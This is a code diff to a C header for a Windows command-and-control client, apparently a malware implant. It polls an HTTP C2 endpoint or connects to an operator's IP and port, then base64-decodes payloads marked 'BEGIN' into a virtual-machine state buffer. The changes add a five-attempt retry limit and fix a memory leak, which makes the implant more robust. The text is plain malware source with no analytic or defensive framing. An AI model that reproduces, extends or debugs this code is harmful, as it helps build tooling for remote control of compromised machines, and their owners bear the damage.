@@ -1,6 +1,7 @@
 #ifndef C2_INCLUDED
 #define C2_INCLUDED
 #define BACKLOG 1000000
+#define MAX_RETRIES 5
 #include <stdio.h>
 #include <windows.h>
 #include <stdlib.h>
@@ -118,7 +119,8 @@ VMstate recvC2(C2 conn){
     }else if(conn.type == HTTP){
         const char magic[] = "BEGIN\n";
         static unsigned int pastnum = 0;
-        while(1){
+        state.isize = -1;
+        for(int i=0;i<MAX_RETRIES;i++){
             Sleep(conn.interval);
             char req[1000] = {0};
             sprintf(req, "%s?iv=%d", conn.pipe, conn.interval);
@@ -127,6 +129,7 @@ VMstate recvC2(C2 conn){
                 goto fin;
             if(memcmp(out, magic, strlen(magic)) != 0) goto fin;
             char* data = calloc(b64d_sz(strlen(out))+100, 1);
+            char* od = data;
             base64_decode(out+strlen(magic), data);
             unsigned int num = 0;
             memcpy(&num, data, 4);
@@ -147,6 +150,7 @@ VMstate recvC2(C2 conn){
             data += 4;
             state.data = calloc(state.dsize+BACKLOG+1, 1) + BACKLOG;
             memcpy(state.data, data, state.dsize);
+            free(od);
             free(out);
             break;
         fin:
@@ -170,7 +174,12 @@ C2* newC2(int type, const char* uuid, ...){
         char* ip = arg(char*);
         int port = arg(int);
         int ival = arg(int);
-        while(newsock(ip, port, conn)) Sleep(ival);
+        int i = 0;
+        while(newsock(ip, port, conn)){
+            Sleep(ival);
+            i++;
+            if(i==MAX_RETRIES) return NULL;
+        }
         c2->pipe = conn;
         sendC2(*c2, nego, strlen(nego));
         char tempuuid[100] = {0};
